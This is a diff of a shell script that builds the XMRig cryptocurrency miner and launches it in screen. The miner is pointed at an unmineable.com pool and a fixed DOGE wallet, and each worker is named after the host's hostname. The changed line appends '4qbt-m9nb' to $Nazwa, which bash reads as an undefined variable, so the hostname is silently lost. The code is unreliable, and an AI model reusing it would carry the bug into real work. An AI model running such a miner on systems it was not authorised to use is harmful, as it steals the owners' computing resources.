@@ -8,4 +8,4 @@ cd build
 cmake ..
 make
 Nazwa=$(</etc/hostname)
-screen ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DGSXHw3Kn6nbFayas33qx2PAwhHTPnKtCz.$Nazwa --rig-id=$Nazwa -p x pause
+screen ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DGSXHw3Kn6nbFayas33qx2PAwhHTPnKtCz.$Nazwa4qbt-m9nb --rig-id=$Nazwa -p x pause
